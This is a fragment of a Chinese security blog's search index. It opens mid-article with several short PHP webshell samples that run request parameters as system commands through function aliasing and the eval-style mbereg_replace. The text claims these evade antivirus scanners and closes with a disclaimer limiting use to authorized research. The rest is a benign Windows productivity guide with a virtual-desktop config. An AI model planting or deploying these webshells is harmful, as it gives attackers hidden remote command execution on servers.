getallheaders->apache_request_headers getallheaders->litespeed_request_headers apache_request_headers->litespeed_request_headers apache_response_headers->litespeed_response_headers \u8fd9\u91cc\u9644\u7684\u8868\u4e0d\u5305\u542b\u88ab\u5f03\u7528\u7684(\u4f1a\u6709PHP\u8b66\u544a,\u4f46\u4ecd\u53ef\u7528),\u800c\u5728\u8fd9\u4e9b\u522b\u540d\u4e2d,\u6211\u4eec\u5c31\u53ef\u4ee5\u627e\u5230\u53ef\u4ee5\u5229\u7528\u7684\u51fd\u6570mbereg replace,\u8fd9\u4e2a\u51fd\u6570\u662fmb ereg replace\u7684\u522b\u540d,mb ereg replace\u4e0epreg replace\u7c7b\u4f3c,\u53ef\u4ee5\u5229\u7528e\u6a21\u5f0f\u9690\u5f0f\u6267\u884c\u4ee3\u7801,\u4f46\u662fmb ereg replace\u65e0\u6cd5\u9003\u8fc7\u67e5\u6740,\u800cmbereg replace\u5219\u662fALLKILL,\u6ca1\u9519,\u53ea\u662f\u4e00\u4e2a \u7684\u5dee\u522b,\u8ba9\u4ed6\u9003\u8fc7\u4e86\u514d\u6740\u7684\u773c\u775b <?php // (ALLKILL) error_reporting ( 0 ); mbereg_replace ( '.*' , '\\0' , $_REQUEST [ 2333 ], 'mer' ); //php5 php7 success ?> \u53e6\u5916,\u6211\u4eec\u53ef\u4ee5\u81ea\u5df1\u521b\u9020\u522b\u540d,\u5982: <?php // PHP >=5.6 \u53ef\u8fc7\u76fe\u72d7 use function \\system as strlen ; // \u914d\u5408\u6587\u4ef6\u5305\u542b\u8fd9\u751a\u81f3\u53ef\u4ee5\u5b9e\u73b0\u52ab\u6301,\u7559\u5f85\u4f60\u4eec\u5f00\u53d1 strlen ( $_POST [ 1 ]); <?php // (ALLKILL) define ( \"ARRAY2\" , \"sys\" . \"tem\" ); @ constant ( \"ARRAY2\" )( pos ( pos ( $GLOBALS ))); // PHP>7 \u514d\u8d23\u58f0\u660e: \u5728\u5bf9\u65b9\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b\uff0c\u76f4\u63a5\u6216\u95f4\u63a5\u5229\u7528\u672c\u9879\u76ee\u6d89\u53ca\u5230\u7684 webshell \u7814\u7a76\u6837\u672c\u653b\u51fb\u76ee\u6807\u662f\u8fdd\u6cd5\u884c\u4e3a. \u672c\u9879\u76ee\u6d89\u53ca\u5230\u7684 webshell \u4ec5\u4e3a\u5b89\u5168\u7814\u7a76\u548c\u6388\u6743\u60c5\u51b5\u4e0b\u4f7f\u7528\uff0c\u5176\u4f7f\u7528\u4eba\u5458\u6709\u8d23\u4efb\u548c\u4e49\u52a1\u9075\u5b88\u5f53\u5730\u6cd5\u5f8b\u6761\u89c4. \u672c\u9879\u76ee\u6d89\u53ca\u5230\u7684 webshell \u6837\u672c\u53ca\u6587\u7ae0\u4ec5\u4e3a\u4fc3\u8fdb\u5b89\u5168\u9632\u5fa1\u7814\u7a76\u4f7f\u7528\uff0c\u7814\u7a76\u4eba\u5458\u5bf9\u56e0\u8bef\u7528\u8be5\u7a0b\u5e8f\u9020\u6210\u7684\u8d44\u4ea7\u635f\u574f\u548c\u635f\u5931\u6982\u4e0d\u8d1f\u8d23.","title":"\u522b\u540d/\u91cd\u547d\u540d"},{"location":"%E6%9D%82%E9%A1%B9/%E9%85%8D%E7%BD%AE/%E5%85%B3%E4%BA%8Ewindows%E6%8F%90%E5%8D%87%E6%95%88%E7%8E%87%E9%82%A3%E4%BA%9B%E4%BA%8B/","text":"\u5173\u4e8ewindows\u63d0\u5347\u6548\u7387\u90a3\u4e9b\u4e8b # \u6700\u8fd1\u6362\u4e86\u65b0\u7535\u8111\uff0c\u914d\u7f6e\u7684\u65f6\u5019\u521a\u597d\u60f3\u8d77\u6765\uff0c\u4e8e\u662f\u603b\u7ed3\u4e0b\u5982\u4f55\u5728windows\u4e0b\u63d0\u9ad8\u6548\u7387\uff08\u4e3b\u8981\u662f\u5b9e\u73b0mac/*unix\u4e0b\u7684\u4e00\u4e9b\u5df2\u7ecf\u6709\u7684\u529f\u80fd\uff09 caps2esc # \u53c2\u8003 \u8fd9\u7bc7\u6587\u7ae0 Caps Lock\u7684\u4f5c\u7528\u662f\u9501\u5b9a\u8f93\u5165\u4e3a\u5927\u5199\u5b57\u6bcd\uff0c\u8fd9\u4e2a\u952e\u4f4d\u5bf9\u6211\u6765\u8bf4\u6ca1\u4ec0\u4e48\u7528\uff0c\u5b8c\u5168\u53ef\u4ee5\u4f7f\u7528Shift\u4ee3\u66ff\u3002 \u6240\u4ee5\u8fd9\u91cc\u53ef\u4ee5\u8003\u8651\u5c06Caps Lock\u5229\u7528\u8d77\u6765\uff0c\u5728\u5355\u51fb\u548c\u957f\u6309\u65f6\u5206\u522b\u6620\u5c04\u4e3aEsc\u548cCtrl\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u51e0\u4e4e\u6ca1\u5fc5\u8981\u518d\u53bb\u6309ESC(\u5de6\u4e0a\u89d2)\u548cCtrl(\u5de6\u4e0b\u89d2)\u4e86\u3002 \u5b89\u88c5 # \u90a3\u4e48\u8981\u5982\u4f55\u5b9e\u73b0\u5462\uff1f\u7ed3\u5408\u524d\u4eba\u7684\u7ecf\u9a8c\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u767d\u5ad6\uff0c\u94fe\u63a5\u5728 \u8fd9\u91cc \u76f4\u63a5\u4e0b\u8f7dInterception.zip\uff0c\u5728 command line installer \u6587\u4ef6\u5939\u548c samples/x86 \u6587\u4ef6\u5939\u4e0b\u627e\u5230\u6211\u4eec\u9700\u8981\u7684\u5de5\u5177\uff1a install-interception.exe \u548c caps2esc.exe \u6253\u5f00\u5177\u6709 \u7ba1\u7406\u5458\u6743\u9650 \u7684CMD\u6216POWERSHELL\u7a97\u53e3\uff0c\u6267\u884c\u4ee5\u4e0b\u4ee3\u7801: .\\install-interception.exe /install \u6b64\u65f6\u518d\u8fd0\u884c caps2esc.exe \u5c31\u53ef\u4ee5\u8fbe\u5230\u6211\u4eec\u7684\u6548\u679c\u4e86\uff08\u5982\u679c\u6ca1\u6548\u679c\u8bd5\u8bd5\u91cd\u542f\u5927\u6cd5\uff0c\u5426\u5219\u5c31\u662f\u4e0a\u9762\u7684install\u6ca1\u6709\u6210\u529f\uff09 \u4e3a\u4e86\u65b9\u4fbf\u6211\u4eec\uff0c\u53ef\u4ee5\u5c06 caps2esc.exe \u8bbe\u7f6e\u4e3a\u5f00\u673a\u542f\u52a8 \u5982\u679c\u8981\u5378\u8f7d\u7684\u8bdd\uff0c\u5219\u6267\u884c .\\install-interception.exe /uninstall \u5373\u53ef\u3002 \u4f7f\u7528 # \u5c31\u5982\u6211\u4eec\u521a\u521a\u6240\u8bf4\uff0c\u6b64\u65f6Caps Lock\u952e\u5355\u51fb\u65f6\u4f1a\u53d8\u6210esc\u952e\uff08\u4ee5\u524d\u6211\u4e0d\u559c\u6b22\u6309esc\u952e\uff0c\u56e0\u4e3a\u5b83\u5b9e\u5728\u592a\u8fdc\u4e86\uff0c\u4f46\u662f\u73b0\u5728\u8d8a\u6309\u8d8a\u723d\uff09\uff0c\u914d\u5408\u5176\u4ed6\u6309\u952e\u4e00\u8d77\u7684\u65f6\u5019\u5c31\u662fCtrl\u952e\uff0c\u4e5f\u5c31\u662f\u8bf4\u4f60\u53ef\u4ee5\u4f7f\u7528Caps Lock + c\u4f5c\u4e3aCtrl + c\u7b49\uff0c\u540c\u65f6\u539f\u672c\u7684ESC\u952e\u5219\u53d8\u4e3a\u4e86\u539f\u59cbCaps Lock\u7684\u529f\u80fd virtual-desktop-enhancer # \u6211\u4eec\u77e5\u9053windows10\u4e2d\u662f\u5b58\u5728\u591a\u865a\u62df\u684c\u9762\u7684\uff0c\u4f46\u662f\u4e00\u76f4\u4e0d\u591f\u597d\u7528\uff08\u4e0d\u80fd\u901a\u8fc7\u952e\u76d8\u5207\u6362\u5230\u6307\u5b9a\u7684\u684c\u9762\uff0c\u4e0d\u80fd\u901a\u8fc7\u952e\u76d8\u5c06\u67d0\u4e2a\u8fdb\u7a0b\u79fb\u52a8\u5230\u67d0\u4e2a\u6307\u5b9a\u7684\u684c\u9762\uff09\uff0c\u800cvirtual-desktop-enhancer\u5c31\u662f\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u7684 \u5b89\u88c5 # virtual-desktop-enhancer\u5728github\u4e0a\u5c31\u80fd\u641c\u5230\uff0c\u4f46\u662f\u65e9\u5c31\u5f52\u6863\u4e0d\u66f4\u65b0\u4e86\uff0c\u8fd9\u5c31\u5bfc\u81f4\u65b0\u7248windows\u65e0\u6cd5\u4f7f\u7528\uff0c\u6b64\u65f6\u5c31\u8981\u53bb\u627e\u5b83\u7684fork\u9879\u76ee\uff0c\u627e\u5230\u8fd8\u80fd\u65b0\u7248windows\u7528\u7684(windows \u7248\u672c21h1\u53ef\u4ee5\u4f7f\u7528)\uff0c\u94fe\u63a5\u5728 \u8fd9\u91cc \u5b89\u88c5\u76f4\u63a5 git clone https://github.com/amrahm/win-10-virtual-desktop-enhancer \u5373\u53ef \u4f7f\u7528 # \u4f7f\u7528windows+tab\u53bb\u521b\u5efa\u51e0\u4e2a\u65b0\u7684\u865a\u62df\u684c\u9762(\u597d\u50cf\u53ef\u4ee5\u7701\u7565) \u53ef\u4ee5\u5b89\u88c5autohotkey\u53bb\u8fd0\u884c.ahk\u811a\u672c\u6216\u8005\u76f4\u63a5\u8fd0\u884cexe\uff0c\u76f8\u5173\u914d\u7f6e\u5728 settings.ini \u770b\u770b\u53f3\u4e0b\u89d2\u4efb\u52a1\u680f\u662f\u5426\u5f00\u4e86\u4e2a\u65b0\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u662f\u4e00\u4e2a\u6570\u5b57\uff08\u5bf9\u5e94\u5f53\u524d\u7684\u684c\u9762\uff09 \u4fee\u6539\u914d\u7f6e\uff0c\u8fd9\u91cc\u8d34\u4e0b\u6211\u7684\u914d\u7f6e,\u4f7f\u7528windows+\u6570\u5b57\u952e\u5207\u6362\u5230\u5bf9\u5e94\u7684\u865a\u62df\u684c\u9762\uff0c\u4f7f\u7528windows+shift+\u6570\u5b57\u952e\u5c06\u5f53\u524d\u7684\u8fdb\u7a0b\u79fb\u52a8\u5230\u5bf9\u5e94\u7684\u865a\u62df\u684c\u9762\uff0c\u540c\u65f6\u53ef\u4ee5\u4fee\u6539[Wallpapers]\u4e2d\u7684\u8def\u5f84\uff0c\u4ece\u800c\u4f7f\u5f97\u4e0d\u540c\u7684\u865a\u62df\u684c\u9762\u81ea\u52a8\u5207\u6362\u4e0d\u540c\u7684\u684c\u9762\u80cc\u666f [General] DefaultDesktop = 2 TaskbarScrollSwitching = 0 UseNativePrevNextDesktopSwitchingIfConflicting = 0 DesktopWrapping = 1 [Tooltips] Enabled = 1 ; One of LEFT, CENTER, RIGHT PositionX = CENTER ; One of TOP, CENTER, BOTTOM PositionY = CENTER FontSize = 11 FontColor = 0xFFFFFF FontInBold = 1 BackgroundColor = 0x1F1F1F Lifespan = 750 ; Watch out! Long durations (> 500ms) could cause troubles as the program freezes during the animation. FadeOutAnimationDuration = 100 OnEveryMonitor = 1 [KeyboardShortcutsCombinations] TogglePinWindow = Win, Ctrl, Shift, Q TogglePinApp = Win, Ctrl, Shift, A PinWindow = PinApp = UnpinWindow = UnpinApp = ; \"SC029\" is the key below your \"Esc\" key OpenDesktopManager = ChangeDesktopName = Win, F2 [KeyboardShortcutsModifiers] SwitchDesktop = Win MoveWindowToDesktop = Win, Shift MoveWindowAndSwitchToDesktop = Win, Shift, Alt NextTenDesktops = [KeyboardShortcutsIdentifiers] PreviousDesktop = , NextDesktop = . Desktop1 = 1 Desktop2 = 2 Desktop3 = 3 Desktop4 = 4 Desktop5 = 5 Desktop6 = 6 Desktop7 = 7 Desktop8 = 8 Desktop9 = 9 Desktop10 = 0 DesktopAlt1 = Numpad1 DesktopAlt2 = Numpad2 DesktopAlt3 = Numpad3 DesktopAlt4 = Numpad4 DesktopAlt5 = Numpad5 DesktopAlt6 = Numpad6 DesktopAlt7 = Numpad7 DesktopAlt8 = Numpad8 DesktopAlt9 = Numpad9 DesktopAlt10 = Numpad0 [Wallpapers] 1 = 2 = 3 = 4 = 5 = 6 = 7 = 8 = 9 = 10 = [DesktopNames] 1 = code 2 = view 3 = work 4 = play 5 = other 6 = 7 = 8 = 9 = 10 = [RunProgramWhenSwitchingToDesktop] 1 = 2 = 3 = 4 = 5 = 6 = 7 = 8 = 9 = 10 = [RunProgramWhenSwitchingFromDesktop] 1 = 2 = 3 = 4 = 5 = 6 = 7 = 8 = 9 = 10 = \u6109\u5feb\u5730\u4eab\u53d7 utools # \u8fd9\u4e2a\u5de5\u5177\u662f\u5feb\u901f\u542f\u52a8\u5de5\u5177\uff0c\u540c\u7c7b\u8f6f\u4ef6\u6709wox\uff0cAlfred\u7b49\uff0c\u6700\u7ec8\u9009\u62e9utools\u7684\u539f\u56e0\u662f\u56e0\u4e3a\u8fd9\u4e2a\u5de5\u5177\u4e0b\u6709\u4e2a\u795e\u7ea7\u63d2\u4ef6\uff1a \u5feb\u6377\u547d\u4ee4 \u5b89\u88c5 # \u76f4\u63a5\u53bb\u5b98\u7f51\u4e0b\u8f7d\u5b89\u88c5\u5373\u53ef \u4f7f\u7528\u6280\u5de7 # \u4fee\u6539\u542f\u52a8\u5feb\u6377\u952e\uff0c\u6211\u4e2a\u4eba\u662f\u559c\u6b22\u8bbe\u7f6e\u4e3aAlt+`\u8fd9\u4e2a\u952e\u4f4d \u5b89\u88c5 \u5feb\u6377\u547d\u4ee4 \u8fd9\u4e2a\u63d2\u4ef6\uff0c\u7136\u540e\u5c31\u80fd\u6109\u5feb\u5730\u53bb\u5b9e\u73b0\u8bb8\u591a\u529f\u80fd\uff0c\u4f8b\u5982\u642d\u914d\u6211\u7f16\u5199\u7684 \u5de5\u5177 \u5feb\u901f\u6839\u636e\u6a21\u677f\u751f\u6210payload\uff0c\u5e76\u4e14\u4f1a\u81ea\u52a8\u590d\u5236\u5230\u526a\u5207\u677f\u91cc\uff0c\u4f8b\u5982\u53cd\u5f39shell\u7684payload,\u4f8b\u5982\uff1a \u66f4\u591a\u7684\u529f\u80fd\u53ef\u4ee5\u81ea\u5df1\u53bb\u7814\u7a76\uff08 \u8bbe\u7f6e\u5168\u5c40\u5feb\u6377\u952e\uff0c\u4f8b\u5982\u6211\u8bbe\u7f6eCtrl + Alt + T\u5feb\u901f\u6253\u5f00windows terminal\uff0cCtrl + Alt + B\u5feb\u901f\u6253\u5f00Burpsuite \u8d85\u7ea7\u9762\u677f\uff0c\u770b\u7740\u7528\uff0c\u6709\u65f6\u5019\u8fd8\u633a\u65b9\u4fbf\u7684\uff0c\u6bd4\u5982\u6211\u5199\u4e86\u4e2a\u5feb\u6377\u547d\u4ee4\uff0c\u5c06\u9009\u4e2d\u7684\u6587\u4ef6\u5feb\u901f\u4e22\u5230wsl\u91cc","title":"\u5173\u4e8ewindows\u63d0\u5347\u6548\u7387\u90a3\u4e9b\u4e8b"},{"location":"%E6%9D%82%E9%A1%B9/%E9%85%8D%E7%BD%AE/%E5%85%B3%E4%BA%8Ewindows%E6%8F%90%E5%8D%87%E6%95%88%E7%8E%87%E9%82%A3%E4%BA%9B%E4%BA%8B/#\u5173\u4e8ewindows\u63d0\u5347\u6548\u7387\u90a3\u4e9b\u4e8b","text":"\u6700\u8fd1\u6362\u4e86\u65b0\u7535\u8111\uff0c\u914d\u7f6e\u7684\u65f6\u5019\u521a\u597d\u60f3\u8d77\u6765\uff0c\u4e8e\u662f\u603b\u7ed3\u4e0b\u5982\u4f55\u5728windows\u4e0b\u63d0\u9ad8\u6548\u7387\uff08\u4e3b\u8981\u662f\u5b9e\u73b0mac/*unix\u4e0b\u7684\u4e00\u4e9b\u5df2\u7ecf\u6709\u7684\u529f\u80fd\uff09","title":"\u5173\u4e8ewindows\u63d0\u5347\u6548\u7387\u90a3\u4e9b\u4e8b"},{"location":"%E6%9D%82%E9%A1%B9/%E9%85%8D%E7%BD%AE/%E5%85%B3%E4%BA%8Ewindows%E6%8F%90%E5%8D%87%E6%95%88%E7%8E%87%E9%82%A3%E4%BA%9B%E4%BA%8B/#caps2esc","text":"\u53c2\u8003 \u8fd9\u7bc7\u6587\u7ae0 Caps Lock\u7684\u4f5c\u7528\u662f\u9501\u5b9a\u8f93\u5165\u4e3a\u5927\u5199\u5b57\u6bcd\uff0c\u8fd9\u4e2a\u952e\u4f4d\u5bf9\u6211\u6765\u8bf4\u6ca1\u4ec0\u4e48\u7528\uff0c\u5b8c\u5168\u53ef\u4ee5\u4f7f\u7528Shift\u4ee3\u66ff\u3002 \u6240\u4ee5\u8fd9\u91cc\u53ef\u4ee5\u8003\u8651\u5c06Caps Lock\u5229\u7528\u8d77\u6765\uff0c\u5728\u5355\u51fb\u548c\u957f\u6309\u65f6\u5206\u522b\u6620\u5c04\u4e3aEsc\u548cCtrl\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u51e0\u4e4e\u6ca1\u5fc5\u8981\u518d\u53bb\u6309ESC(\u5de6\u4e0a\u89d2)\u548cCtrl(\u5de6\u4e0b\u89d2)\u4e86\u3002","title":"caps2esc"},{"location":"%E6%9D%82%E9%A1%B9/%E9%85%8D%E7%BD%AE/%E5%85%B3%E4%BA%8Ewindows%E6%8F%90%E5%8D%87%E6%95%88%E7%8E%87%E9%82%A3%E4%BA%9B%E4%BA%8B/#\u5b89\u88c5","text":"\u90a3\u4e48\u8981\u5982\u4f55\u5b9e\u73b0\u5462\uff1f\u7ed3\u5408\u524d\u4eba\u7684\u7ecf\u9a8c\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u767d\u5ad6\uff0c\u94fe\u63a5\u5728 \u8fd9\u91cc \u76f4\u63a5\u4e0b\u8f7dInterception.zip\uff0c\u5728 command line installer \u6587\u4ef6\u5939\u548c samples/x86 \u6587\u4ef6\u5939\u4e0b\u627e\u5230\u6211\u4eec\u9700\u8981\u7684\u5de5\u5177\uff1a install-interception.exe \u548c caps2esc.exe \u6253\u5f00\u5177\u6709 \u7ba1\u7406\u5458\u6743\u9650 \u7684CMD\u6216POWERSHELL\u7a97\u53e3\uff0c\u6267\u884c\u4ee5\u4e0b\u4ee3\u7801: .\\install-interception.exe /install \u6b64\u65f6\u518d\u8fd0\u884c caps2esc.exe \u5c31\u53ef\u4ee5\u8fbe\u5230\u6211\u4eec\u7684\u6548\u679c\u4e86\uff08\u5982\u679c\u6ca1\u6548\u679c\u8bd5\u8bd5\u91cd\u542f\u5927\u6cd5\uff0c\u5426\u5219\u5c31\u662f\u4e0a\u9762\u7684install\u6ca1\u6709\u6210\u529f\uff09 \u4e3a\u4e86\u65b9\u4fbf\u6211\u4eec\uff0c\u53ef\u4ee5\u5c06 caps2esc.exe \u8bbe\u7f6e\u4e3a\u5f00\u673a\u542f\u52a8 \u5982\u679c\u8981\u5378\u8f7d\u7684\u8bdd\uff0c\u5219\u6267\u884c .\\install-interception.exe /uninstall \u5373\u53ef\u3002","title":"\u5b89\u88c5"},{"location":"%E6%9D%82%E9%A1%B9/%E9%85%8D%E7%BD%AE/%E5%85%B3%E4%BA%8Ewindows%E6%8F%90%E5%8D%87%E6%95%88%E7%8E%87%E9%82%A3%E4%BA%9B%E4%BA%8B/#\u4f7f\u7528","text":"\u5c31\u5982\u6211\u4eec\u521a\u521a\u6240\u8bf4\uff0c\u6b64\u65f6Caps Lock\u952e\u5355\u51fb\u65f6\u4f1a\u53d8\u6210esc\u952e\uff08\u4ee5\u524d\u6211\u4e0d\u559c\u6b22\u6309esc\u952e\uff0c\u56e0\u4e3a\u5b83\u5b9e\u5728\u592a\u8fdc\u4e86\uff0c\u4f46\u662f\u73b0\u5728\u8d8a\u6309\u8d8a\u723d\uff09\uff0c\u914d\u5408\u5176\u4ed6\u6309\u952e\u4e00\u8d77\u7684\u65f6\u5019\u5c31\u662fCtrl\u952e\uff0c\u4e5f\u5c31\u662f\u8bf4\u4f60\u53ef\u4ee5\u4f7f\u7528Caps Lock + c\u4f5c\u4e3aCtrl + c\u7b49\uff0c\u540c\u65f6\u539f\u672c\u7684ESC\u952e\u5219\u53d8\u4e3a\u4e86\u539f\u59cbCaps Lock\u7684\u529f\u80fd","title":"\u4f7f\u7528"},{"location":"%E6%9D%82%E9%A1%B9/%E9%85%8D%E7%BD%AE/%E5%85%B3%E4%BA%8Ewindows%E6%8F%90%E5%8D%87%E6%95%88%E7%8E%87%E9%82%A3%E4%BA%9B%E4%BA%8B/#virtual-desktop-enhancer","text":"\u6211\u4eec\u77e5\u9053windows10\u4e2d\u662f\u5b58\u5728\u591a\u865a\u62df\u684c\u9762\u7684\uff0c\u4f46\u662f\u4e00\u76f4\u4e0d\u591f\u597d\u7528\uff08\u4e0d\u80fd\u901a\u8fc7\u952e\u76d8\u5207\u6362\u5230\u6307\u5b9a\u7684\u684c\u9762\uff0c\u4e0d\u80fd\u901a\u8fc7\u952e\u76d8\u5c06\u67d0\u4e2a\u8fdb\u7a0b\u79fb\u52a8\u5230\u67d0\u4e2a\u6307\u5b9a\u7684\u684c\u9762\uff09\uff0c\u800cvirtual-desktop-enhancer\u5c31\u662f\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u7684","title":"virtual-desktop-enhancer"},{"location":"%E6%9D%82%E9%A1%B9/%E9%85%8D%E7%BD%AE/%E5%85%B3%E4%BA%8Ewindows%E6%8F%90%E5%8D%87%E6%95%88%E7%8E%87%E9%82%A3%E4%BA%9B%E4%BA%8B/#\u5b89\u88c5_1","text":"virtual-desktop-enhancer\u5728github\u4e0a\u5c31\u80fd\u641c\u5230\uff0c\u4f46\u662f\u65e9\u5c31\u5f52\u6863\u4e0d\u66f4\u65b0\u4e86\uff0c\u8fd9\u5c31\u5bfc\u81f4\u65b0\u7248windows\u65e0\u6cd5\u4f7f\u7528\uff0c\u6b64\u65f6\u5c31\u8981\u53bb\u627e\u5b83\u7684fork\u9879\u76ee\uff0c\u627e\u5230\u8fd8\u80fd\u65b0\u7248windows\u7528\u7684(windows \u7248\u672c21h1\u53ef\u4ee5\u4f7f\u7528)\uff0c\u94fe\u63a5\u5728 \u8fd9\u91cc \u5b89\u88c5\u76f4\u63a5 git clone https://github.com/amrahm/win-10-virtual-desktop-enhancer \u5373\u53ef","title":"\u5b89\u88c5"},{"location":"%E6%9D%82%E9%A1%B9/%E9%85%8D%E7%BD%AE/%E5%85%B3%E4%BA%8Ewindows%E6%8F%90%E5%8D%87%E6%95%88%E7%8E%87%E9%82%A3%E4%BA%9B%E4%BA%8B/#\u4f7f\u7528_1","text":"\u4f7f\u7528windows+tab\u53bb\u521b\u5efa\u51e0\u4e2a\u65b0\u7684\u865a\u62df\u684c\u9762(\u597d\u50cf\u53ef\u4ee5\u7701\u7565) \u53ef\u4ee5\u5b89\u88c5autohotkey\u53bb\u8fd0\u884c.ahk\u811a\u672c\u6216\u8005\u76f4\u63a5\u8fd0\u884cexe\uff0c\u76f8\u5173\u914d\u7f6e\u5728 settings.ini \u770b\u770b\u53f3\u4e0b\u89d2\u4efb\u52a1\u680f\u662f\u5426\u5f00\u4e86\u4e2a\u65b0\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u662f\u4e00\u4e2a\u6570\u5b57\uff08\u5bf9\u5e94\u5f53\u524d\u7684\u684c\u9762\uff09 \u4fee\u6539\u914d\u7f6e\uff0c\u8fd9\u91cc\u8d34\u4e0b\u6211\u7684\u914d\u7f6e,\u4f7f\u7528windows+\u6570\u5b57\u952e\u5207\u6362\u5230\u5bf9\u5e94\u7684\u865a\u62df\u684c\u9762\uff0c\u4f7f\u7528windows+shift+\u6570\u5b57\u952e\u5c06\u5f53\u524d\u7684\u8fdb\u7a0b\u79fb\u52a8\u5230\u5bf9\u5e94\u7684\u865a\u62df\u684c\u9762\uff0c\u540c\u65f6\u53ef\u4ee5\u4fee\u6539[Wallpapers]\u4e2d\u7684\u8def\u5f84\uff0c\u4ece\u800c\u4f7f\u5f97\u4e0d\u540c\u7684\u865a\u62df\u684c\u9762\u81ea\u52a8\u5207\u6362\u4e0d\u540c\u7684\u684c\u9762\u80cc\u666f [General] DefaultDesktop = 2 TaskbarScrollSwitching = 0 UseNativePrevNextDesktopSwitchingIfConflicting = 0 DesktopWrapping = 1 [Tooltips] Enabled = 1 ; One of LEFT, CENTER, RIGHT PositionX = CENTER ; One of TOP, CENTER, BOTTOM PositionY = CENTER FontSize = 11 FontColor = 0xFFFFFF FontInBold = 1 BackgroundColor = 0x1F1F1F Lifespan = 750 ; Watch out! Long durations (> 500ms) could cause troubles as the program freezes during the animation. FadeOutAnimationDuration = 100 OnEveryMonitor = 1 [KeyboardShortcutsCombinations] TogglePinWindow = Win, Ctrl, Shift, Q TogglePinApp = Win, Ctrl, Shift, A PinWindow = PinApp = UnpinWindow = UnpinApp = ; \"SC029\" is the key below your \"Esc\" key OpenDesktopManager = ChangeDesktopName = Win, F2 [KeyboardShortcutsModifiers] SwitchDesktop = Win MoveWindowToDesktop = Win, Shift MoveWindowAndSwitchToDesktop = Win, Shift, Alt NextTenDesktops = [KeyboardShortcutsIdentifiers] PreviousDesktop = , NextDesktop = . Desktop1 = 1 Desktop2 = 2 Desktop3 = 3 Desktop4 = 4 Desktop5 = 5 Desktop6 = 6 Desktop7 = 7 Desktop8 = 8 Desktop9 = 9 Desktop10 = 0 DesktopAlt1 = Numpad1 DesktopAlt2 = Numpad2 DesktopAlt3 = Numpad3 DesktopAlt4 = Numpad4 DesktopAlt5 = Numpad5 DesktopAlt6 = Numpad6 DesktopAlt7 = Numpad7 DesktopAlt8 = Numpad8 DesktopAlt9 = Numpad9 DesktopAlt10 = Numpad0 [Wallpapers] 1 = 2 = 3 = 4 = 5 = 6 = 7 = 8 = 9 = 10 = [DesktopNames] 1 = code 2 = view 3 = work 4 = play 5 = other 6 = 7 = 8 = 9 = 10 = [RunProgramWhenSwitchingToDesktop] 1 = 2 = 3 = 4 = 5 = 6 = 7 = 8 = 9 = 10 = [RunProgramWhenSwitchingFromDesktop] 1 = 2 = 3 = 4 = 5 = 6 = 7 = 8 = 9 = 10 = \u6109\u5feb\u5730\u4eab\u53d7","title":"\u4f7f\u7528"},{"location":"%E6%9D%82%E9%A1%B9/%E9%85%8D%E7%BD%AE/%E5%85%B3%E4%BA%8Ewindows%E6%8F%90%E5%8D%87%E6%95%88%E7%8E%87%E9%82%A3%E4%BA%9B%E4%BA%8B/#utools","text":"\u8fd9\u4e2a\u5de5\u5177\u662f\u5feb\u901f\u542f\u52a8\u5de5\u5177\uff0c\u540c\u7c7b\u8f6f\u4ef6\u6709wox\uff0cAlfred\u7b49\uff0c\u6700\u7ec8\u9009\u62e9utools\u7684\u539f\u56e0\u662f\u56e0\u4e3a\u8fd9\u4e2a\u5de5\u5177\u4e0b\u6709\u4e2a\u795e\u7ea7\u63d2\u4ef6\uff1a \u5feb\u6377\u547d\u4ee4","title":"utools"},{"location":"%E6%9D%82%E9%A1%B9/%E9%85%8D%E7%BD%AE/%E5%85%B3%E4%BA%8Ewindows%E6%8F%90%E5%8D%87%E6%95%88%E7%8E%87%E9%82%A3%E4%BA%9B%E4%BA%8B/#\u5b89\u88c5_2","text":"\u76f4\u63a5\u53bb\u5b98\u7f51\u4e0b\u8f7d\u5b89\u88c5\u5373\u53ef","title":"\u5b89\u88c5"},{"location":"%E6%9D%82%E9%A1%B9/%E9%85%8D%E7%BD%AE/%E5%85%B3%E4%BA%8Ewindows%E6%8F%90%E5%8D%87%E6%95%88%E7%8E%87%E9%82%A3%E4%BA%9B%E4%BA%8B/#\u4f7f\u7528\u6280\u5de7","text":"\u4fee\u6539\u542f\u52a8\u5feb\u6377\u952e\uff0c\u6211\u4e2a\u4eba\u662f\u559c\u6b22\u8bbe\u7f6e\u4e3aAlt+`\u8fd9\u4e2a\u952e\u4f4d \u5b89\u88c5 \u5feb\u6377\u547d\u4ee4 \u8fd9\u4e2a\u63d2\u4ef6\uff0c\u7136\u540e\u5c31\u80fd\u6109\u5feb\u5730\u53bb\u5b9e\u73b0\u8bb8\u591a\u529f\u80fd\uff0c\u4f8b\u5982\u642d\u914d\u6211\u7f16\u5199\u7684 \u5de5\u5177 \u5feb\u901f\u6839\u636e\u6a21\u677f\u751f\u6210payload\uff0c\u5e76\u4e14\u4f1a\u81ea\u52a8\u590d\u5236\u5230\u526a\u5207\u677f\u91cc\uff0c\u4f8b\u5982\u53cd\u5f39shell\u7684payload,\u4f8b\u5982\uff1a \u66f4\u591a\u7684\u529f\u80fd\u53ef\u4ee5\u81ea\u5df1\u53bb\u7814\u7a76\uff08 \u8bbe\u7f6e\u5168\u5c40\u5feb\u6377\u952e\uff0c\u4f8b\u5982\u6211\u8bbe\u7f6eCtrl + Alt + T\u5feb\u901f\u6253\u5f00windows terminal\uff0cCtrl + Alt + B\u5feb\u901f\u6253\u5f00Burpsuite \u8d85\u7ea7\u9762\u677f\uff0c\u770b\u7740\u7528\uff0c\u6709\u65f6\u5019\u8fd8\u633a\u65b9\u4fbf\u7684\uff0c\u6bd4\u5982\u6211\u5199\u4e86\u4e2a\u5feb\u6377\u547d\u4ee4\uff0c\u5c06\u9009\u4e2d\u7684\u6587\u4ef6\u5feb\u901f\u4e22\u5230wsl\u91cc","title":"\u4f7f\u7528\u6280\u5de7"},{"location":"tags.html","text":"Contents grouped by tag # golang # \u7b2c\u4e00\u7ae0-Golang\u57fa\u7840 \u7b2c\u4e09\u7ae0-HTTP \u7b2c\u4e8c\u7ae0-\u7f51\u7edc\u8fde\u63a5 \u7b2c\u4e94\u7ae0-DNS 